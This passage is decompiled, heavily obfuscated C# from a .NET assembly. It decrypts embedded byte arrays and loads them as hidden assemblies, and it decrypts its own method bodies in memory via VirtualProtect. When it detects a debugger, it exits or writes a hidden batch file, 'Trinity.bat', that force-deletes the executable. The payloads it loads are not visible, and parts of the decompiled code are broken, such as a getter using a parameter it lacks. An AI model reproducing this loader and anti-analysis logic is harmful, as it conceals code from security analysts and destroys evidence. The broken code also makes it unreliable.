			array3[0] = (array3[0] ^ array2[0]);
			array3[1] = (array3[1] ^ array2[1]);
			array3[2] = (array3[2] ^ array2[2]);
			array3[3] = (array3[3] ^ array2[3]);
			array3[4] = (array3[4] ^ array2[4]);
			array3[5] = (array3[5] ^ array2[5]);
			array3[6] = (array3[6] ^ array2[6]);
			array3[7] = (array3[7] ^ array2[7]);
			array3[8] = (array3[8] ^ array2[8]);
			array3[9] = (array3[9] ^ array2[9]);
			array3[10] = (array3[10] ^ array2[10]);
			array3[11] = (array3[11] ^ array2[11]);
			array3[12] = (array3[12] ^ array2[12]);
			array3[13] = (array3[13] ^ array2[13]);
			array3[14] = (array3[14] ^ array2[14]);
			array3[15] = (array3[15] ^ array2[15]);
			for (int k = 0; k < 16; k++)
			{
				uint num5 = array3[k];
				array4[num4++] = (byte)num5;
				array4[num4++] = (byte)(num5 >> 8);
				array4[num4++] = (byte)(num5 >> 16);
				array4[num4++] = (byte)(num5 >> 24);
				array2[k] ^= num5;
			}
			num3 += 16;
		}
		<Module>.DuplicateTableName2 = Assembly.Load(<Module>.DataGridViewClipboardCopyMode(array4));
		AppDomain.CurrentDomain.AssemblyResolve += <Module>.FSetTrackingComponent;
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00003A44 File Offset: 0x00001C44
	internal static Assembly FSetTrackingComponent(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (<Module>.DuplicateTableName2.FullName == resolveEventArgs_0.Name)
		{
			for (;;)
			{
				switch (<Module>.AsyncOperation(2001256095) % 3)
				{
				case 0:
					continue;
				case 2:
					goto IL_36;
				}
				break;
			}
			goto IL_3C;
			IL_36:
			return <Module>.DuplicateTableName2;
		}
		IL_3C:
		return null;
	}

	// Token: 0x06000023 RID: 35 RVA: 0x00003A90 File Offset: 0x00001C90
	internal static void Zip()
	{
		uint num = 112U;
		uint[] array = new uint[]
		{
			1207586802U,
			3339588242U,
			1877776053U,
			3661737463U,
			980639163U,
			2882944530U,
			4127690939U,
			2256734246U,
			3480360219U,
			3615916441U,
			1664977050U,
			605753078U,
			3339596194U,
			4018018670U,
			1622596825U,
			3378755256U,
			846201744U,
			4145437439U,
			404935978U,
			2235143870U,
			3144499375U,
			3861247529U,
			2910347078U,
			2574377341U,
			2873361731U,
			1982681326U,
			830248559U,
			3054308477U,
			1262162169U,
			2959600790U,
			460149596U,
			3994729306U,
			348777887U,
			21524007U,
			1927038389U,
			4115451805U,
			1121964189U,
			987672131U,
			1387559974U,
			4206639275U,
			1578390172U,
			1277221585U,
			1502799090U,
			3031974062U,
			3584241113U,
			404312586U,
			1376725176U,
			2510474015U,
			3544164312U,
			9976205U,
			1849151734U,
			1465792128U,
			321145811U,
			3873463590U,
			2159784580U,
			915037282U,
			1038296240U,
			3588768194U,
			3470108309U,
			2980583013U,
			314988706U,
			1425278115U,
			2959850012U,
			2844975452U,
			22646329U,
			1100812632U,
			2389387729U,
			3593194270U,
			2837754069U,
			3202624792U,
			2850072400U,
			2560782856U,
			2236077995U,
			2037827448U,
			669597300U,
			3807397437U,
			1518364332U,
			1966755670U,
			2705498083U,
			1351075745U,
			3882945738U,
			4192480080U,
			3083383024U,
			2520905491U,
			367976465U,
			820917954U,
			1543079050U,
			171948282U,
			2898603377U,
			554584780U,
			2407836559U,
			4040809047U,
			2104688941U,
			2362252180U,
			3746536393U,
			686994615U,
			3297140507U,
			52633809U,
			1696625525U,
			1969838194U,
			1738330042U,
			907001274U,
			767258210U,
			3947719771U,
			477767669U,
			2237755553U,
			127587829U,
			3443006546U,
			2424270098U,
			2244807616U,
			591536882U,
			1484864208U
		};
		uint[] array2 = new uint[16];
		uint num2 = 2176674167U;
		for (int i = 0; i < 16; i++)
		{
			num2 ^= num2 >> 13;
			num2 ^= num2 << 25;
			num2 ^= num2 >> 27;
			array2[i] = num2;
		}
		int num3 = 0;
		int num4 = 0;
		uint[] array3 = new uint[16];
		byte[] array4 = new byte[num * 4U];
		while ((long)num3 < (long)((ulong)num))
		{
			for (int j = 0; j < 16; j++)
			{
				array3[j] = array[num3 + j];
			}
			uint num5 = array3[15] * 29U;
			uint num6 = array3[15] * 30U;
			uint num7 = array3[15] << 3;
			num6 += array3[0] * 118U;
			array3[12] = (array3[12] ^ ~array3[4]);
			num7 += array3[0] * 31U;
			num5 += array3[0] * 116U;
			array3[7] = array3[7] - array3[5];
			uint num8 = array3[15] * 13U;
			num8 += array3[0] * 51U;
			num8 += array3[6] * 42U;
			num5 += array3[6] * 100U;
			num7 += array3[6] * 25U;
			num7 += array3[13] * 26U;
			num6 += array3[6] * 98U;
			num8 += array3[13] * 44U;
			array3[0] = num8;
			array3[14] = array3[14] - array3[9];
			num6 += array3[13] * 103U;
			num5 += array3[13] * 107U;
			array3[6] = num6;
			array3[2] = (array3[2] ^ 4199786215U);
			array3[13] = num5;
			num8 = array3[3] >> 28;
			num5 = (array3[11] & 195494119U);
			array3[8] = (array3[8] ^ ~array3[1]);
			num5 *= 1515689581U;
			array3[3] = array3[3] << 4;
			array3[11] = (array3[11] & 4099473176U);
			array3[11] = (array3[11] | (array3[10] & 195494119U));
			array3[3] = (array3[3] | num8);
			array3[10] = (array3[10] & 4099473176U);
			num8 = array3[14] << 13;
			array3[10] = (array3[10] | num5 * 669770597U);
			array3[14] = array3[14] >> 19;
			array3[15] = num7;
			num5 = (array3[9] & 1897011138U);
			num7 = array3[11] << 23;
			array3[3] = (array3[3] ^ array3[7]);
			array3[9] = (array3[9] & 2397956157U);
			array3[9] = (array3[9] | (array3[5] & 1897011138U));
			array3[4] = (array3[4] ^ 1714790140U);
			array3[5] = (array3[5] & 2397956157U);
			array3[11] = array3[11] >> 9;
			num6 = array3[2] << 22;
			array3[6] = array3[6] - 2753051180U;
			array3[13] = array3[13] * 1746838639U;
			num5 *= 2527386139U;
			array3[14] = (array3[14] | num8);
			array3[14] = (array3[14] ^ array2[14]);
			array3[11] = (array3[11] | num7);
			array3[9] = (array3[9] ^ array2[9]);
			num7 = array3[9] << 4;
			array3[14] = (array3[14] ^ 3134677464U);
			array3[13] = (array3[13] ^ 3746000563U);
			num8 = array3[10] << 8;
			array3[5] = (array3[5] | num5 * 3163058195U);
			num5 = array3[14] << 2;
			array3[4] = (array3[4] ^ ~array3[12]);
			array3[9] = array3[9] >> 28;
			array3[2] = array3[2] >> 10;
			array3[1] = (array3[1] ^ array3[8]);
			array3[15] = array3[15] - 1537097311U;
			array3[10] = array3[10] >> 24;
			array3[10] = (array3[10] | num8);
			num5 += array3[14];
			array3[6] = array3[6] * 1303026143U;
			num5 += array3[1] << 1;
			array3[9] = (array3[9] | num7);
			num5 += array3[1] << 4;
			num8 = (array3[15] & 3419013780U);
			array3[15] = (array3[15] & 875953515U);
			num5 += array3[4] * 22U;
			array3[2] = (array3[2] | num6);
			num7 = array3[12] >> 18;
			array3[15] = (array3[15] | (array3[11] & 3419013780U));
			num5 += array3[3] * 25U;
			array3[12] = array3[12] << 14;
			array3[0] = (array3[0] ^ 276795560U);
			array3[12] = (array3[12] | num7);
			num6 = array3[14] * 22U;
			num8 *= 2184800953U;
			num6 += array3[1] * 77U;
			array3[13] = (array3[13] ^ array2[13]);
			array3[11] = (array3[11] & 875953515U);
			num7 = array3[14] << 1;
			array3[11] = (array3[11] | num8 * 2239200137U);
			num8 = array3[14] << 2;
			num8 += array3[14] << 3;
			array3[2] = array3[2] - 1002079937U;
			num6 += array3[4] * 94U;
			num7 += array3[14] << 3;
			array3[14] = num5;
			num7 += array3[1] << 5;
			array3[6] = (array3[6] ^ array2[6]);
			num8 += array3[1] * 39U;
			num7 += array3[4] << 2;
			num7 += array3[4] << 5;
			array3[7] = (array3[7] ^ array3[0]);
			num8 += array3[4] * 45U;
			num8 += array3[3] * 55U;
			num5 = array3[6] * 3322581425U;
			num7 += array3[3] * 45U;
			num6 += array3[3] * 108U;
			array3[1] = num7;
			array3[6] = array3[9];
			array3[2] = (array3[2] ^ array2[2]);
			array3[9] = num5 * 2279675729U;
			array3[7] = (array3[7] ^ array2[7]);
			array3[3] = num8;
			array3[8] = array3[8] - array3[5];
			num8 = (array3[5] & 3575380962U);
			num7 = array3[0] << 20;
			num5 = array3[7] << 1;
			num5 += array3[7] << 2;
			array3[4] = num6;
			num5 += array3[3] << 3;
			array3[0] = array3[0] >> 12;
			num5 += array3[3];
			array3[0] = (array3[0] | num7);
			num6 = array3[7] << 1;
			num7 = array3[7] << 3;
			array3[5] = (array3[5] & 719586333U);
			num7 += array3[3] * 14U;
			num7 += array3[8] * 31U;
			array3[5] = (array3[5] | (array3[2] & 3575380962U));
			array3[1] = (array3[1] ^ array2[1]);
			array3[11] = (array3[11] ^ ~array3[12]);
			num6 += array3[7] << 2;
			num7 += array3[13] * 28U;
			num8 *= 1314797991U;
			array3[2] = (array3[2] & 719586333U);
			num5 += array3[8] * 19U;
			array3[2] = (array3[2] | num8 * 1634131479U);
			num8 = array3[7] << 4;
			num6 += array3[3] << 1;
			num8 += array3[7];
			num6 += array3[3] << 4;
			num8 += array3[3] * 30U;
			array3[11] = (array3[11] ^ 1146111807U);
			array3[4] = array3[4] * 3498764625U;
			num5 += array3[13] * 19U;
			num6 += array3[8] * 43U;
			array3[10] = (array3[10] ^ 1267173743U);
			num6 += array3[13] * 29U;
			array3[0] = (array3[0] ^ array2[0]);
			num8 += array3[8] << 1;
			num8 += array3[8] << 6;
			array3[5] = (array3[5] ^ 1214967709U);
			array3[7] = num5;
			array3[15] = (array3[15] ^ array2[15]);
			array3[8] = num7;
			num5 = array3[4] * 14U;
			num8 += array3[13] * 59U;
			array3[10] = (array3[10] ^ array3[15]);
			array3[13] = num6;
			array3[3] = num8;
			num5 += array3[1] << 2;
			num8 = array3[4] << 3;
			num7 = (array3[7] & 2674508032U);
			num5 += array3[1] << 5;
			array3[7] = (array3[7] & 1620459263U);
			num8 += array3[4] << 5;
			num8 += array3[1] * 104U;
			num6 = array3[4] * 44U;
			array3[10] = (array3[10] ^ 3527744842U);
			array3[14] = (array3[14] ^ 2804288836U);
			array3[7] = (array3[7] | (array3[14] & 2674508032U));
			array3[14] = (array3[14] & 1620459263U);
			array3[8] = (array3[8] ^ array2[8]);
			array3[10] = (array3[10] ^ array2[10]);
			num5 += array3[9] * 58U;
			num7 *= 4261384627U;
			num6 += array3[1] * 113U;
			array3[14] = (array3[14] | num7 * 3807479163U);
			num8 += array3[9] * 169U;
			num5 += array3[2] * 25U;
			num6 += array3[9] * 181U;
			num7 = array3[4] * 51U;
			num8 += array3[2] << 3;
			array3[0] = (array3[0] ^ ~array3[1]);
			num6 += array3[2] * 78U;
			num7 += array3[1] << 2;
			num7 += array3[1] << 7;
			array3[4] = num5;
			num7 += array3[9] * 213U;
			array3[1] = num6;
			array3[6] = (array3[6] ^ ~array3[8]);
			num8 += array3[2] << 6;
			array3[4] = (array3[4] ^ array2[4]);
			num7 += array3[2] * 91U;
			num6 = (array3[4] & 1390720633U);
			array3[2] = num8;
			num5 = array3[15] >> 29;
			array3[3] = (array3[3] ^ array2[3]);
			num8 = (array3[12] & 2272828342U);
			array3[15] = array3[15] << 3;
			num8 *= 2764485819U;
			array3[4] = (array3[4] & 2904246662U);
			array3[15] = (array3[15] | num5);
			array3[12] = (array3[12] & 2022138953U);
			array3[12] = (array3[12] | (array3[0] & 2272828342U));
			array3[4] = (array3[4] | (array3[11] & 1390720633U));
			num6 *= 3697547529U;
			array3[0] = (array3[0] & 2022138953U);
			array3[0] = (array3[0] | num8 * 231829619U);
			num8 = array3[14] << 7;
			array3[11] = (array3[11] & 2904246662U);
			array3[14] = array3[14] >> 25;
			array3[14] = (array3[14] | num8);
			array3[11] = (array3[11] | num6 * 2885633337U);
			array3[9] = num7;
			num5 = (array3[3] & 2401901304U);
			array3[3] = (array3[3] & 1893065991U);
			num5 *= 611512405U;
			array3[1] = (array3[1] ^ 3523245122U);
			num6 = array3[0] << 16;
			array3[0] = array3[0] >> 16;
			array3[5] = (array3[5] ^ array2[5]);
			array3[3] = (array3[3] | (array3[13] & 2401901304U));
			array3[0] = (array3[0] | num6);
			num6 = array3[3] << 2;
			num7 = array3[14] * 404718373U;
			array3[13] = (array3[13] & 1893065991U);
			num8 = array3[3] * 49U;
			array3[14] = array3[2];
			array3[2] = num7 * 400875693U;
			array3[12] = (array3[12] ^ array2[12]);
			num6 += array3[3] << 3;
			array3[13] = (array3[13] | num5 * 1427279101U);
			num5 = array3[3] << 4;
			num8 += array3[10] * 46U;
			num7 = array3[3] * 19U;
			num5 += array3[3] << 5;
			num8 += array3[8] << 4;
			num6 += array3[10] * 11U;
			num7 += array3[10] << 1;
			array3[12] = (array3[12] ^ ~array3[13]);
			num8 += array3[8];
			num5 += array3[10] * 47U;
			array3[15] = (array3[15] ^ 2254964174U);
			num5 += array3[8] * 25U;
			num6 += array3[8] << 1;
			num7 += array3[10] << 4;
			num6 += array3[8];
			num6 += array3[5] * 61U;
			array3[3] = num6;
			num8 += array3[5] * 252U;
			num5 += array3[5] * 252U;
			num6 = array3[13] * 792795461U;
			num7 += array3[8] << 3;
			array3[13] = array3[6];
			array3[6] = num6 * 3746664845U;
			array3[8] = num8;
			num7 += array3[5] * 98U;
			num8 = array3[6] << 1;
			array3[5] = num5;
			num5 = array3[6] * 11U;
			array3[10] = num7;
			num8 += array3[6];
			array3[12] = array3[12] * 41208673U;
			num8 += array3[3] * 7U;
			num7 = array3[6] << 2;
			num5 += array3[3] * 30U;
			num6 = 0U + (array3[3] << 1);
			num8 += array3[14] << 1;
			num6 += array3[14] << 1;
			num5 += array3[14] * 43U;
			num8 += array3[14] << 3;
			num7 += array3[6] << 3;
			num7 += array3[3] << 5;
			num7 += array3[3];
			num7 += array3[14] * 47U;
			num6 += array3[14];
			array3[1] = (array3[1] ^ array3[9]);
			num6 += array3[11] << 1;
			num7 += array3[11] << 1;
			num5 += array3[11] * 30U;
			num8 += array3[11] * 7U;
			num7 += array3[11] << 5;
			array3[11] = num7;
			array3[6] = num8;
			num8 = array3[2] << 3;
			num8 += array3[2];
			array3[14] = num6;
			num6 = array3[2] * 13U;
			array3[3] = num5;
			num6 += array3[13] * 19U;
			num7 = array3[2] * 50U;
			num5 = array3[2] << 1;
			num5 += array3[2] << 6;
			num7 += array3[13] * 71U;
			array3[7] = (array3[7] ^ array3[9]);
			num6 += array3[0] * 42U;
			num7 += array3[0] * 163U;
			num8 += array3[13] << 2;
			array3[7] = (array3[7] ^ 2456214013U);
			num7 += array3[12] * 142U;
			num8 += array3[13] << 3;
			num5 += array3[13] * 91U;
			num5 += array3[0] * 217U;
			num8 += array3[0] * 30U;
			num8 += array3[12] * 26U;
			num5 += array3[12] * 187U;
			array3[13] = num8;
			array3[0] = num7;
			num6 += array3[12] * 37U;
			array3[2] = num6;
			array3[12] = num5;
			num6 = array3[0] << 4;
			num5 = array3[1] << 6;
			array3[1] = array3[1] >> 26;
			num8 = array3[0] << 3;
			array3[1] = (array3[1] | num5);
			num5 = array3[0] * 7U;
			num5 += array3[1] << 1;
			num8 += array3[1] << 1;
			num7 = array3[5] * 2481128569U;
			array3[5] = array3[4];
			array3[9] = (array3[9] ^ array3[8]);
			num5 += array3[1] << 3;
			array3[4] = num7 * 217851337U;
			num7 = array3[0] * 41U;
			num8 += array3[1] << 4;
			num8 += array3[2] * 49U;
			num6 += array3[1] * 25U;
			num6 += array3[2] * 61U;
			num5 += array3[2] << 3;
			array3[11] = (array3[11] ^ array2[11]);
			num7 += array3[1] * 73U;
			array3[15] = (array3[15] ^ ~array3[10]);
			num8 += array3[3] << 3;
			num7 += array3[2] * 187U;
			num5 += array3[2] << 4;
			num7 += array3[3] * 81U;
			num6 += array3[3] * 22U;
			array3[0] = num6;
			num8 += array3[3] << 4;
			num5 += array3[3] << 1;
			array3[1] = num8;
			num5 += array3[3] << 3;
			array3[3] = num7;
			array3[2] = num5;
			for (int k = 0; k < 16; k++)
			{
				uint num9 = array3[k];
				array4[num4++] = (byte)num9;
				array4[num4++] = (byte)(num9 >> 8);
				array4[num4++] = (byte)(num9 >> 16);
				array4[num4++] = (byte)(num9 >> 24);
				array2[k] ^= num9;
			}
			num3 += 16;
		}
		<Module>.get_DisplayStyleForCurrentCellOnly = Assembly.Load(<Module>.DataGridViewClipboardCopyMode(array4));
		AppDomain.CurrentDomain.AssemblyResolve += <Module>.get_IsGenericInst;
	}

	// Token: 0x17000006 RID: 6
	// (get) Token: 0x06000024 RID: 36 RVA: 0x00004BAC File Offset: 0x00002DAC
	internal static Assembly IsGenericInst
	{
		get
		{
			if (<Module>.get_DisplayStyleForCurrentCellOnly.FullName == resolveEventArgs_0.Name)
			{
				for (;;)
				{
					switch (<Module>.AsyncOperation(-1278505284) % 3)
					{
					case 0:
						continue;
					case 1:
						goto IL_36;
					}
					break;
				}
				goto IL_3C;
				IL_36:
				return <Module>.get_DisplayStyleForCurrentCellOnly;
			}
			IL_3C:
			return null;
		}
	}

	// Token: 0x06000025 RID: 37
	[DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
	internal static extern bool VirtualProtect_1(IntPtr intptr_0, uint uint_10, uint uint_11, ref uint uint_12);

	// Token: 0x06000026 RID: 38
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	// Token: 0x06000027 RID: 39 RVA: 0x00004BF8 File Offset: 0x00002DF8
	internal static void get_CountItemFormat()
	{
		string text = string.Empty;
		string str = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
		text += "@ECHO OFF\n";
		text += "ping 127.0.0.1 > nul\n";
		text += "echo j | del /F ";
		text = text + str + "\n";
		text += "echo j | del Trinity.bat";
		File.WriteAllText("Trinity.bat", text);
		new Process
		{
			StartInfo = 
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "Trinity.bat"
			}
		}.Start();
	}

	// Token: 0x06000028 RID: 40 RVA: 0x00004CB0 File Offset: 0x00002EB0
	internal unsafe static void InvalidSortString()
	{
		Module module = typeof(<Module>).Module;
		string fullyQualifiedName = module.FullyQualifiedName;
		bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
		byte* ptr = (byte*)((void*)Marshal.GetHINSTANCE(module));
		byte* ptr2 = ptr + *(uint*)(ptr + 60);
		ushort num = *(ushort*)(ptr2 + 6);
		ushort num2 = *(ushort*)(ptr2 + 20);
		bool flag2 = false;
		uint* ptr3 = null;
		uint num3 = 0U;
		uint* ptr4 = (uint*)(ptr2 + 24 + num2);
		uint num4 = 3023543950U;
		uint num5 = 1765854605U;
		uint num6 = 2893121159U;
		uint num7 = 1400932245U;
		<Module>.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag2);
		if (flag2)
		{
			<Module>.get_CountItemFormat();
		}
		for (int i = 0; i < (int)num; i++)
		{
			uint num8 = *(ptr4++) * *(ptr4++);
			if (num8 == 2698572491U)
			{
				ptr3 = (uint*)(ptr + (UIntPtr)(flag ? ptr4[3] : ptr4[1]) / 4);
				<Module>.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag2);
				if (flag2)
				{
					Environment.Exit(0);
				}
				num3 = (flag ? ptr4[2] : (*ptr4)) >> 2;
			}
			else if (num8 != 0U)
			{
				uint* ptr5 = (uint*)(ptr + (UIntPtr)(flag ? ptr4[3] : ptr4[1]) / 4);
				uint num9 = ptr4[2] >> 2;
				for (uint num10 = 0U; num10 < num9; num10 += 1U)
				{
					uint num11 = (num4 ^ *(ptr5++)) + num5 + num6 * num7;
					num4 = num5;
					num5 = num7;
					num7 = num11;
				}
			}
			ptr4 += 8;
		}
		uint[] array = new uint[16];
		uint[] array2 = new uint[16];
		for (int j = 0; j < 16; j++)
		{
			array[j] = num7;
			array2[j] = num5;
			num4 = (num5 >> 5 | num5 << 27);
			num5 = (num6 >> 3 | num6 << 29);
			<Module>.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag2);
			if (flag2)
			{
				Environment.Exit(0);
			}
			num6 = (num7 >> 7 | num7 << 25);
			num7 = (num4 >> 11 | num4 << 21);
		}
		array[0] = (array[0] ^ array2[0]);
		array[1] = array[1] * array2[1];
		array[2] = array[2] + array2[2];
		array[3] = (array[3] ^ array2[3]);
		array[4] = array[4] * array2[4];
		array[5] = array[5] + array2[5];
		array[6] = (array[6] ^ array2[6]);
		array[7] = array[7] * array2[7];
		array[8] = array[8] + array2[8];
		array[9] = (array[9] ^ array2[9]);
		array[10] = array[10] * array2[10];
		array[11] = array[11] + array2[11];
		array[12] = (array[12] ^ array2[12]);
		array[13] = array[13] * array2[13];
		array[14] = array[14] + array2[14];
		array[15] = (array[15] ^ array2[15]);
		uint num12 = 64U;
		<Module>.VirtualProtect_1((IntPtr)((void*)ptr3), num3 << 2, 64U, ref num12);
		if (num12 == 64U)
		{
			return;
		}
		uint num13 = 0U;
		for (uint num14 = 0U; num14 < num3; num14 += 1U)
		{
			*ptr3 ^= array[(int)(num13 & 15U)];
			array[(int)(num13 & 15U)] = (array[(int)(num13 & 15U)] ^ *(ptr3++)) + 1035675673U;
			<Module>.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag2);
			if (flag2)
			{
				Environment.Exit(0);
			}
			num13 += 1U;
		}
	}

	// Token: 0x06000029 RID: 41 RVA: 0x0001975C File Offset: 0x0001975C
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int AsyncOperation(int int_28);

	// Token: 0x0600002A RID: 42 RVA: 0x00019784 File Offset: 0x00019784
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int TryGetValueTypeSig(int int_28);

	// Token: 0x17000007 RID: 7
	// (set) Token: 0x0600002B RID: 43 RVA: 0x000197AC File Offset: 0x000197AC
	static extern int BottomToolStripPanelVisible { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] set; }

	// Token: 0x0600002C RID: 44 RVA: 0x000197CC File Offset: 0x000197CC
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int GZipOptionalHeaderFlags(int int_28);

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x0600002D RID: 45 RVA: 0x000197F8 File Offset: 0x000197F8
	static extern int ProductVersion { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x0600002E RID: 46 RVA: 0x00019820 File Offset: 0x00019820
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int GetIDispatchForObjectInContext(int int_28);

	// Token: 0x0600002F RID: 47 RVA: 0x00019848 File Offset: 0x00019848
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int CERT_SELECT_CRITERIA(int int_28);

	// Token: 0x06000030 RID: 48 RVA: 0x00019870 File Offset: 0x00019870
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int CreateObjRef(int int_28);

	// Token: 0x06000031 RID: 49 RVA: 0x00019894 File Offset: 0x00019894
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int CreateCast(int int_28);

	// Token: 0x06000032 RID: 50 RVA: 0x000198B4 File Offset: 0x000198B4
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int BarVertical(int int_28);

	// Token: 0x06000033 RID: 51 RVA: 0x000198E0 File Offset: 0x000198E0
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int GetAuditRules(int int_28);

	// Token: 0x06000034 RID: 52 RVA: 0x00019908 File Offset: 0x00019908
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int WriteSubtree(int int_28);

	// Token: 0x17000009 RID: 9
	// (get) Token: 0x06000035 RID: 53 RVA: 0x00019930 File Offset: 0x00019930
	static extern int TwoDigitYearMax { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000036 RID: 54 RVA: 0x00019954 File Offset: 0x00019954
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int remove_DropDownOpening(int int_28);

	// Token: 0x1700000A RID: 10
	// (get) Token: 0x06000037 RID: 55 RVA: 0x00019980 File Offset: 0x00019980
	static extern int Codebase { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000038 RID: 56 RVA: 0x000199A0 File Offset: 0x000199A0
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int SafeCustomLineCapHandle(int int_28);

	// Token: 0x06000039 RID: 57 RVA: 0x000199C8 File Offset: 0x000199C8
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int InsertTypeParameter(int int_28);

	// Token: 0x0600003A RID: 58 RVA: 0x000199EC File Offset: 0x000199EC
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int DefineEvent(int int_28);

	// Token: 0x0600003B RID: 59 RVA: 0x00019A10 File Offset: 0x00019A10
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int AsnEncodedDataEnumerator(int int_28);

	// Token: 0x1700000B RID: 11
	// (get) Token: 0x0600003C RID: 60 RVA: 0x00019A34 File Offset: 0x00019A34
	static extern int FilteredSuiteName { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x0600003D RID: 61 RVA: 0x00019A58 File Offset: 0x00019A58
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int DrawCurve(int int_28);

	// Token: 0x0600003E RID: 62 RVA: 0x00019A7C File Offset: 0x00019A7C
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int EnumChildrenCallback(int int_28);

	// Token: 0x1700000C RID: 12
	// (get) Token: 0x0600003F RID: 63 RVA: 0x00019AA4 File Offset: 0x00019AA4
	static extern int TopLevelControl { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000040 RID: 64 RVA: 0x00019AC8 File Offset: 0x00019AC8
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int Trace(int int_28);

	// Token: 0x1700000D RID: 13
	// (get) Token: 0x06000041 RID: 65 RVA: 0x00019894 File Offset: 0x00019894
	static extern int AttributeWildcard { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000042 RID: 66 RVA: 0x00019AEC File Offset: 0x00019AEC
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int put_CursorType(int int_28);

	// Token: 0x1700000E RID: 14
	// (set) Token: 0x06000043 RID: 67 RVA: 0x00019B10 File Offset: 0x00019B10
	static extern int MinWorkingSet { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] set; }

	// Token: 0x1700000F RID: 15
	// (get) Token: 0x06000044 RID: 68 RVA: 0x00019B38 File Offset: 0x00019B38
	static extern int Hours { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x06000045 RID: 69 RVA: 0x00019B60 File Offset: 0x00019B60
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int AssemblyCopyrightAttribute(int int_28);

	// Token: 0x06000046 RID: 70 RVA: 0x00019B88 File Offset: 0x00019B88
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int EndDrag(int int_28);

	// Token: 0x06000047 RID: 71 RVA: 0x00019980 File Offset: 0x00019980
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int MatchEvaluator(int int_28);

	// Token: 0x06000048 RID: 72 RVA: 0x00019BAC File Offset: 0x00019BAC
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int Mscorlib_DictionaryValueCollectionDebugView(int int_28);

	// Token: 0x06000049 RID: 73 RVA: 0x00019BCC File Offset: 0x00019BCC
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int GetDragDropEffect(int int_28);

	// Token: 0x17000010 RID: 16
	// (set) Token: 0x0600004A RID: 74 RVA: 0x00019BF0 File Offset: 0x00019BF0
	static extern int InstanceName { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] set; }

	// Token: 0x0600004B RID: 75 RVA: 0x00019C14 File Offset: 0x00019C14
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int remove_QueryCanResetValue(int int_28);

	// Token: 0x0600004C RID: 76 RVA: 0x00019C40 File Offset: 0x00019C40
	[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
	static extern int EnumMembers(int int_28);

	// Token: 0x17000011 RID: 17
	// (get) Token: 0x0600004D RID: 77 RVA: 0x00019C68 File Offset: 0x00019C68
	static extern int EmfPlusHeaderSize { [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)] get; }

	// Token: 0x17000012 RID: 18
	// (get) Token: 0x0600004E RID: 78 RVA: 0x00019C8C File Offset: 0x00019C8C
